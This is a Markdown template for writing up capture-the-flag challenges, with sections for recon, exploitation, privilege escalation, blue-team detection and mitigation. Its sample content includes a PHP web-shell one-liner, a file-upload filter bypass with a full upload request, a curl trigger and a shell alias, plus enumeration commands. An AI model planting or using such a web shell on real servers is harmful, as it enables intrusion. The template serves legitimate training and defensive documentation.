# CTF Platform — Challenge Name Category, & Points

```yaml
meta:
  date: YYYY-MM-DD
  author: Your Name or Handle
  platform: <HTB | THM | NCL | picoCTF | ...>
  category: <web | pwn | crypto | forensics | reversing | misc>
  difficulty: <easy | medium | hard | insane>
  points: <int>
  link: <challenge URL>
  file: <YYYY-MM-<platform>-<slug>.md>
  tags: [<platform>, <category>, <tech stack>, <cve?>]
  time_spent: "<hh:mm>"
  tools: [nmap, feroxbuster, burp, gobuster, ghidra, pwntools, wireshark]
  redaction: [usernames, IPs, flags]
```

> **Flag Redaction:** Replace the exact flag with `FLAG{redacted}`. Store real flags, creds, and PII **outside the repo**.

---

## 🧠 TL;DR

One‑paragraph summary of the path to flag. Include the **vuln**, **primitive**, and **fix**.

**Final Payload / Key Insight:**

```
<one‑liner payload or command>
```

---

## 🧪 Environment

* Target: `<hostname | IP>`
* Your host: `<IP / OS / kernel>`
* Network notes: `<VPN | subnet | latency>`
* Attachments: link PCAPs or binaries under a local folder (do **not** commit secrets):

  * `evidence/<YYYY-MM-DD>/<file>`

---

## 🔎 Recon

### Passive

* Whatdo you learn from the challenge page or hints?
* Tech stack, frameworks, error banners.

### Active

Commands and output (trim to the relevant lines):

```bash
nmap -sV -sC -p- <target>
feroxbuster -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -k
```

Observations:

* `80/tcp` runs nginx; `/admin` requires auth.
* `/uploads` allows arbitrary file types.

---

## 🎯 Exploitation

**Hypothesis:**

* e.g., *Unvalidated file upload → web‑shell → RCE.*

**Steps:**

1. Craft payload / PoC

```php
<?php system($_GET['cmd']); ?>
```

2. Bypass filters / defenses (explain):

* Double extension `.php.jpg`
* `Content-Type: image/jpeg`

3. Trigger:

```bash
curl "http://<target>/uploads/shell.php.jpg?cmd=id"
```

**Result:**

* `uid=www-data` proves code execution.

> Screenshots: `evidence/YYYY-MM-DD/exp-1.png`

---

## ⬆️ Privilege Escalation (if applicable)

1. Local enum:

```bash
linpeas.sh | tee lp.log
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

2. Vector chosen and why
3. Exploit steps / payload
4. Proof (`id`, `whoami`, `hostname`, flag path)

---

## 📦 Post‑Exploitation / Loot

* Flag location and context (redacted)
* Interesting creds/tokens (redacted)
* Useful files: configs, backups

---

## 🛡️ Detection & Defense (Blue‑Team Notes)

**What would detect it?** Map to logs and rules.

| Action            | Log Source       | Field/Indicator        | Sample Query                              |         |
| ----------------- | ---------------- | ---------------------- | ----------------------------------------- | ------- |
| Web‑shell exec    | Web server / WAF | `?cmd=` or `curl/ua`   | `http.request.uri:*cmd=*`                 |         |
| Suspicious upload | Web logs         | double extension       | \`file.name:/.php.(jpg                    | png)/\` |
| Lateral scan      | FW logs          | many ports from one IP | `count(distinct dst_port) by src_ip > 50` |         |

**NL‑### Lab Validation:** Reference relevant tests from `lab/validation/validation-checklist.md`.

* NL‑003/004 — DNS block tests
* NL‑006/008 — Lateral movement blocked

**ATT\&CK Mapping:**

* `T1190 Exploit Public-Facing Application`
* `T1059 Command and Scripting Interpreter`

**Mitigations:**

* Enforce upload allowlist + server‑side MIME validation
* Store uploads outside webroot; deny `execute` on uploads dir
* WAF rule: block query params matching `cmd|;|&&|$()`

---

## 🧩 Root Cause / Remediation (If Real‑World)

* CWE: `<id and name>`
* Fix: `<code change, config, patch>`
* Test: write a regression test or add a WAF rule.

---

## 📝 Lessons Learned

* What surprised you?
* What will you do faster next time?
* New tool or technique learned.

---

## 📎 Appendix

### Payloads

```http
POST /upload HTTP/1.1
Host: <target>
Content-Type: multipart/form-data; boundary=---abc

---abc
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
---abc--
```

### Useful One‑Liners

```bash
# web‑shell helper
alias rce='f(){ curl -s "http://<target>/uploads/shell.php.jpg?cmd=$*";}; f'
```

### References

* Vendor advisory or CVE (if any)
* Useful blog posts / cheat sheets

---

## ✅ Submission Checklist

* [ ] Repro steps are complete and minimal
* [ ] Flag redacted (`FLAG{redacted}`)
* [ ] Evidence saved under `notes/ctf/evidence/YYYY-MM-DD/`
* [ ] Blue‑team section references NL‑### tests
* [ ] ATT\&CK techniques included
* [ ] Links validated
